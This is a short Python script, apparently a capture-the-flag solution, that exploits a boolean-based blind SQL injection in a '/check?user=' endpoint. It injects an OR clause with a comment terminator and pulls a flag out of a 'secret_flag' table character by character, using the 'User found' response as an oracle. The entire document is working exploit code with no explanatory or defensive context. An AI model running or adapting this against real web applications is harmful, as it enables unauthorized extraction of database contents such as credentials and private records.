import urllib.parse
from helper import get_raw

CHARSET = "FLAG{}_abcdefghijklmnopqrstuvwxyz0123456789"

def oracle(cond):
    payload = f"zzz' OR ({cond}) -- "
    return "User found" in get_raw("/check?user=" + urllib.parse.quote(payload))

flag = ""
for pos in range(1, 60):
    for ch in CHARSET:
        cond = f"substr((SELECT flag FROM secret_flag),{pos},1)='{ch}'"
        if oracle(cond):
            flag += ch
            break
    else:
        break
    if flag.endswith("}"):
        break
print(flag)
